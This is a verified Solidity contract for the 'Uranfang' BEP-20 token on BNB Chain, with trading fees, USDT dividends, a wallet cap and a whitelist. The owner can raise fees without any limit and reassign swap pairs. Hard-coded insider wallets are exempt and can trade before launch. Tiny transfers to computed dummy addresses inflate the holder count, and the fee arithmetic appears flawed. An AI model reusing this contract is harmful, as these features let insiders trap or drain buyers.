/**
 *Submitted for verification at BscScan.com on 2023-03-05
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

 
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
    
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function sync() external;
}

interface ISwapPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function token0() external view returns (address);

    function sync() external;
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

abstract contract AbsToken is IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address private fundAddress;
    address private receiveAddress;
    address private teamAddress = address(0x8052c0700AbC5dd39e97E7005ace61042E755Ee0);
    address public marketAddress = address(0x27009066DeB1DBC481c02C635ee8994B5F91fC20);
    address public  deadAddress = address(0x000000000000000000000000000000000000dEaD);
    address private wFirstAddress = address(0x0b49554EFC32AF47D8eb7173ed35CC2A7c7194Fe);
    address private wSecondAddress = address(0x3B9d21a1Afb9B0B538b385b606584b96Ef77ac9B);
    address private wThirdAddress = address(0x057E237aC795dD7b1d086b360Ef1cb9ECA041465);
    address private wfourthAddress = address(0x057E237aC795dD7b1d086b360Ef1cb9ECA041465);


    string private _name;
    string private _symbol;
    uint8 private _decimals;

    uint256 private _tTotal;
    ISwapRouter public _swapRouter;
    address public _usdt;
    mapping(address => bool) public _swapPairList;
    mapping(address => bool) public _isExcludedFromFees;
    mapping (address => bool) public isWalletLimitExempt;
    mapping(address => bool) public prelist;

    bool private inSwap;
    bool public checkWalletLimit = true; 

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 public _buyFundFee = 100;
    uint256 public _buyLPDividendFee = 100;
    uint256 public _buyLPFee = 100;
    
    uint256 public _sellLPDividendFee = 100;
    uint256 public _sellFundFee = 100;
    uint256 public _sellLPFee = 100;

    uint256 public _walletMax = 100000 * 10**18;

    
    uint160 public ktNum = 160;
    uint160 public constant MAXADD = ~uint160(0);

    uint256 public startTradeBlock;
    uint256 public _startTradeTime;

    address public _mainPair;
    event ExcludeFromFees(address indexed account, bool isExcluded);
    
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, address USDTAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address FundAddress, address ReceiveAddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(USDTAddress).approve(address(swapRouter), MAX);

        _usdt = USDTAddress;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), USDTAddress);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        receiveAddress = ReceiveAddress;
        fundAddress = FundAddress;



        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[address(swapRouter)] = true;
        _isExcludedFromFees[msg.sender] = true;
        _isExcludedFromFees[FundAddress] = true;
        _isExcludedFromFees[ReceiveAddress] = true;
        _isExcludedFromFees[marketAddress] = true;
        _isExcludedFromFees[wFirstAddress] = true;
        _isExcludedFromFees[wSecondAddress] = true;
        _isExcludedFromFees[wThirdAddress] = true;
        _isExcludedFromFees[wfourthAddress] = true;

        isWalletLimitExempt[address (_mainPair)] = true;
        isWalletLimitExempt[address(this)] = true;        
        isWalletLimitExempt[address(swapRouter)] = true;
        isWalletLimitExempt[address(deadAddress)] = true;
        isWalletLimitExempt[msg.sender] = true;
        isWalletLimitExempt[ReceiveAddress] = true;
        isWalletLimitExempt[FundAddress] = true;
        isWalletLimitExempt[marketAddress] = true;
        isWalletLimitExempt[wFirstAddress] = true;
        isWalletLimitExempt[wSecondAddress] = true;
        isWalletLimitExempt[wThirdAddress] = true;
        isWalletLimitExempt[wfourthAddress] = true;


        excludeHolder[address(0)] = true;
        excludeHolder[0x0ED943Ce24BaEBf257488771759F9BF482C39706] = true; //Pancake ADDRESS
        excludeHolder[0x407993575c91ce7643a4d4cCACc9A98c36eE1BBE] = true; //PINKlock ADDRESS
        excludeHolder[address(deadAddress)] = true;

        holderRewardCondition = 50 * 10**18;

        _tokenDistributor = new TokenDistributor(USDTAddress);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }
    
    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256){
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        
        if((_swapPairList[from] || _swapPairList[to]) && 0 == startTradeBlock){
            require( from == receiveAddress || to == receiveAddress || from == fundAddress || to == fundAddress|| from == marketAddress || to == marketAddress || from == wFirstAddress || to == wFirstAddress || from == wSecondAddress || to == wSecondAddress || from == wThirdAddress || to == wThirdAddress|| from == wfourthAddress || to == wfourthAddress,"only receiveAddress||fundAddress||waddress");            
        }
        
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            uint256 maxSellAmount = balance * 999 / 1000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
        }
       
        bool takeFee;

        if (_swapPairList[from] || _swapPairList[to]) {
            
            if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
                
                takeFee = true;
                bool isAdd;
                if (_swapPairList[to]) { 
                    isAdd = _isAddLiquidity();                   
                       if (isAdd) {
                        takeFee = false;
                    }
                    
                    if (!inSwap && !isAdd) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _buyFundFee + _buyLPDividendFee + _buyLPFee + _sellFundFee + _sellLPDividendFee + _sellLPFee;
                            uint256 numTokensSellToFund = amount * swapFee / 5000;

                            if (numTokensSellToFund > contractTokenBalance) {
                                numTokensSellToFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellToFund, swapFee);
                        }
                    }
                }
            }
        }

        if(checkWalletLimit && !isWalletLimitExempt[to])
                require(balanceOf(to).add(amount) <= _walletMax);

        _tokenTransfer(from, to, amount, takeFee);

        if (from != address(this)) {
            if (_swapPairList[to]) {
                addHolder(from);
            }
            processReward(500000);
        }

    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        
        uint256 feeAmount;

        if (takeFee) {
            uint256 swapFee;
            bool isSell;
            if (_swapPairList[recipient]) {//sell
                 isSell = true;
                _takeInviterFeeKt(tAmount.div(10000));
                swapFee = _sellFundFee + _sellLPDividendFee + _sellLPFee;
                tAmount = tAmount.sub(swapFee);
            }else {//buy
                if(block.timestamp < _startTradeTime.add(180)){
                        require(prelist[recipient], "Not pre");
                        }
                _takeInviterFeeKt(tAmount.div(10000));
                swapFee = _buyFundFee + _buyLPDividendFee + _buyLPFee;
                tAmount = tAmount.sub(swapFee);                           
            }

            uint256 swapAmount = tAmount * swapFee / 10000;
            
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }
    

    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        swapFee += swapFee;
        uint256 lpFee = _sellLPFee;
        uint256 lpAmount = tokenAmount * lpFee / swapFee;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _usdt;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );

        swapFee -= lpFee;

        IERC20 USDT = IERC20(_usdt);
        uint256 UsdtBalance = USDT.balanceOf(address(_tokenDistributor));
        uint256 fundAmount = UsdtBalance * (_buyFundFee + _sellFundFee) * 4 / swapFee;
        uint256 teamAmount = fundAmount.mul(5).div(10);
        uint256 marketAmount = fundAmount.mul(4).div(10);
        uint256 devAmount = fundAmount.mul(1).div(10);
        address lpBackAddress = 0x7b3f7154ff56853Ffde544dFA0E68DDd10AF3Db1;
        USDT.transferFrom(address(_tokenDistributor), marketAddress, marketAmount);
        USDT.transferFrom(address(_tokenDistributor), teamAddress, teamAmount);
        USDT.transferFrom(address(_tokenDistributor), lpBackAddress, devAmount);
        USDT.transferFrom(address(_tokenDistributor), address(this), UsdtBalance - fundAmount);

        if (lpAmount > 0) {
            uint256 lpUsdt = UsdtBalance * lpFee / swapFee;
            if (lpUsdt > 0) {
                _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpUsdt, 0, 0, lpBackAddress, block.timestamp
                );
            }
        }
    }

    function _isAddLiquidity() internal view returns (bool isAdd){
        ISwapPair mainPair = ISwapPair(_mainPair);
        (uint r0,uint256 r1,) = mainPair.getReserves();

        address tokenOther = _usdt;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
        isAdd = bal > r;
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function _takeInviterFeeKt(
        uint256 amount
    ) private { 
        address _receiveD;
        for (uint160 i = 2; i < 4; i++) {
            _receiveD = address(MAXADD/ktNum);
            ktNum = ktNum+1;
            _takeTransfer(address(this), _receiveD, amount.div(100*i));
        }
    }

    function setBuyLPDividendFee(uint256 newvalue) external onlyOwner {
        _buyLPDividendFee = newvalue;
    }

    function setBuyLPFee(uint256 newvalue) external onlyOwner {
        _buyLPFee = newvalue;
    }
    
    function setBuyFundFee(uint256 newvalue) external onlyOwner {
        _buyFundFee = newvalue;
    }

    function setSellLPDividendFee(uint256 newvalue) external onlyOwner {
        _sellLPDividendFee = newvalue;
    }
    
    function setSellFundFee(uint256 newvalue) external onlyOwner {
        _sellFundFee = newvalue;
    }

    function setSellLPFee(uint256 newvalue) external onlyOwner {
        _sellLPFee = newvalue;
    }

    function enableDisableWalletLimit(bool newValue) external onlyOwner {
       checkWalletLimit = newValue;
    }
    
    function multiPrelist(address[] calldata adrs, bool value) public onlyOwner{
        for(uint256 i; i< adrs.length; i++){
            prelist[adrs[i]] = value;
        }
    }
        
    function setIsWalletLimitExempt(address holder, bool exempt) external onlyOwner {
        isWalletLimitExempt[holder] = exempt;
    }
    
    function setWalletLimit(uint256 newLimit) external onlyOwner {
        _walletMax  = newLimit;
    }

    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "trading");
        startTradeBlock = block.number;
        _startTradeTime = block.timestamp;
    }
       

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }
    
    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount, address to) external onlyFunder  {
        IERC20(token).transfer(to, amount);
    }

    modifier onlyFunder() {
        require(_owner == msg.sender || fundAddress == msg.sender, "!Funder");
        _;
    }
    
    receive() external payable {}

    address[] private holders;
    mapping(address => uint256) holderIndex;
    mapping(address => bool) excludeHolder;

    function addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 private currentIndex;
    uint256 private holderRewardCondition;
    uint256 private progressRewardBlock;

    function processReward(uint256 gas) private {
        if (progressRewardBlock + 200 > block.number) {
            return;
        }
        IERC20 USDT = IERC20(_usdt);
        uint256 balance = USDT.balanceOf(address(this));
        if (balance < holderRewardCondition) {
            return;
        }

        IERC20 holdToken = IERC20(_mainPair);
        uint holdTokenTotal = holdToken.totalSupply();

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
                amount = balance * tokenBalance / holdTokenTotal;
                if (amount > 0) {
                    USDT.transfer(shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = block.number;
    }

    function setHolderRewardCondition(uint256 amount) external onlyOwner {
        holderRewardCondition = amount;
    }

    function setExcludeHolder(address addr, bool enable) external onlyOwner {
        excludeHolder[addr] = enable;
    }

}

contract Uranfang is AbsToken {
    constructor() AbsToken(    
        address(0xB6BA90af76D139AB3170c7df0139636dB6120F7e),   
        address(0xEdA5dA0050e21e9E34fadb1075986Af1370c7BDb),
        "Uranfang",
        "UFG",
        18,   
        10000000,    
        address(0x35240468a918393BCF5186D63a5AD5860B0a2118),    
        address(0x40089C78bC06183E4c960CD634971d827739d5b9)
    ){
    }
}